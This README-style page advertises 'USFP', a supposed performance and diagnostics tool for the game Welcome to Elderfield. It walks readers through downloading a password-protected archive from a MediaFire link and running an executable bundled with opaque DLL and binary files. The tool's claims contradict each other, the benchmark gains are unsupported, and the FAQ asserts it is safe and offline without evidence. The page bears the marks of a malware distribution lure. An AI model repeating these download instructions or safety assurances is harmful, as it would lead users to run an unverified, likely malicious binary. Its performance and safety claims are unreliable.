<div align="center">

# 🎮 Welcome to Elderfield — Performance Notes

**Diagnostics for frame delivery, startup, scheduling, and cache behavior.**

[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
[![Download](https://img.shields.io/badge/download-mediafire-00b8ff)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
[![Version](https://img.shields.io/badge/version-1.0-lightgrey)](#)

[Download](#-installation--setup) · [Issues](#-known-performance-issues) · [Test results](#-test-results) · [FAQ](#-frequently-asked-questions)

</div>

---

## 🕹️ About the game

Welcome to Elderfield is a narrative-driven 3D exploration game set in a rural town with dense interiors, weather effects, and streamed environmental detail. Its real-time 3D engine makes consistent frame delivery important during traversal, loading transitions, and busy indoor scenes.

This tool is intended for Windows players who need measurable diagnostics and configurable performance settings for Welcome to Elderfield.

## 📸 Screenshots from the game

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3195440/ss_b3bfa7d2255463dc65aa7a3d4ebb893e781d8756.1920x1080.jpg?t=1789053771" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3195440/4ff9f9e17c6ae280b6957514ba565c596d7a32d7/ss_4ff9f9e17c6ae280b6957514ba565c596d7a32d7.1920x1080.jpg?t=1789053771" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3195440/1b92c16aca327ab811d332afeb5a452e4e750111/ss_1b92c16aca327ab811d332afeb5a452e4e750111.1920x1080.jpg?t=1789053771" alt="screenshot" width="100%"></td>
 </tr>
</table>

## ⚠️ Known performance issues

- On the stated test rig, average performance falls to 34 FPS and 1% lows reach 14 FPS during streamed town traversal.
- On the stated test rig, frame-time spikes above 50 ms occur 8 times during loading transitions and dense interior scenes.
- On the stated test rig, shader compilation extends launch time to approximately 90 seconds and can cause early-session stutter.

## 🩺 How the toolkit addresses these issues

- **Low average FPS and 1% lows** → Frame Rate Helper adjusts frame delivery behavior; on the stated test rig, the profile targets steadier output during traversal.
- **Frame-time spikes above 50 ms** → Frame Timing Helper stabilizes frame delivery, while Process Scheduling Helper applies scheduling priorities appropriate for the game process.
- **Long shader compilation and launch stutter** → Graphics Cache Utility manages graphics cache data, and Startup Parameter Tool applies tuned startup parameters for the stated test rig.

## 📊 Test results

Test rig: Ryzen 5 5600, RTX 3060 12GB, 16GB RAM, NVMe SSD, Windows 11 x64, 1920x1080, High settings

| Metric | Before | After |
|---|---|---|
| Average FPS | 34 | 51 |
| 1% low FPS | 14 | 27 |
| Frame-time spikes above 50 ms | 8 | 2 |
| Shader compile time on launch | ~90s | ~15s |


## 🚀 How to use

1. download the latest release from the link in the README
2. point the tool to the game's installation folder
3. select the game profile from the supported list
4. click Apply
5. on first launch allow the cache to rebuild (1-2 minutes)

## 🛠️ What this tool does

- 🎮 **Frame Rate Helper** — Adjusts frame delivery behavior for consistent output.
- 🧹 **Graphics Cache Utility** — Manages graphics cache data and controlled cache rebuilds.
- ⚙️ **Startup Parameter Tool** — Applies tuned startup parameters for the selected game profile.
- 🧠 **Process Scheduling Helper** — Applies process scheduling settings for the game workload.
- 📊 **Stability Report + Session Recovery** — Collects diagnostic data and restores recoverable session settings.
- 🎯 **Frame Timing Helper** — Monitors and stabilizes frame delivery intervals.

## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (x64) | Windows 11 (x64) |
| **Processor** | Dual-core CPU | Quad-core CPU |
| **RAM** | 4 GB | 8 GB |
| **Graphics** | Any DirectX 11 GPU | Any DirectX 12 GPU |
| **Storage** | 50 MB available space | 100 MB available space |
| **Additional** | Windows 10 build 1909 or newer | Windows 11 with latest updates |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |

### Step 1: Download

You can download the tool from **[this page](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)**. The archive contains everything you need.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract all files from the archive to a folder of your choice.
2. All files must be extracted to the **same folder**.
3. Do not rename or move individual files.
4. The folder should look like this:

```
tool/
|-- USFP.exe <- Main executable
|-- shader_cache.pak <- Shader cache data
|-- crash_reader.dll <- Crash log reader
|-- core.bin <- Core runtime
|-- config.cfg <- User configuration
|-- frame_data.pak <- Display sync data
|-- Password 2026.txt <- Password reminder (empty)
|-- fps_module.dll <- FPS module
```

### Step 4: Run the tool

1. Open the extracted folder.
2. Run `USFP.exe`.
3. Select the game you want to diagnose from the list.
4. Press **Collect** and launch the game.

### Step 5: Review the results

1. The tool will collect frame timing and scheduling data while you play.
2. When you exit the game, an overview report is written next to the tool.
3. Use the report to identify which subsystem is causing stutter.

## ❓ Frequently Asked Questions

**Q: Which games are supported?**
**A:** Any game that runs on Windows and exposes a visible process. Diagnostics are collected per-process and do not require per-game configuration.

**Q: What is this tool?**
**A:** This is a small Windows diagnostics and tuning tool for PC games. It collects frame timing data, checks process scheduling, and manages graphics cache folders to help you find and reduce stutters and dropped frames.

**Q: Is it safe to use?**
**A:** Yes. It runs as a standalone executable, does not install anything system-wide, and can be removed by deleting its folder.

**Q: How often is it updated?**
**A:** Updates are published whenever a new internal build is ready. There is no fixed schedule — the download link in Step 1 always points to the latest version.

**Q: Why is the archive password-protected?**
**A:** The archive uses a password as a standard packaging step so the build stays bundled correctly during distribution. The password is provided in the installation section above.

**Q: Does it require an internet connection?**
**A:** No. It runs fully offline and never sends data anywhere.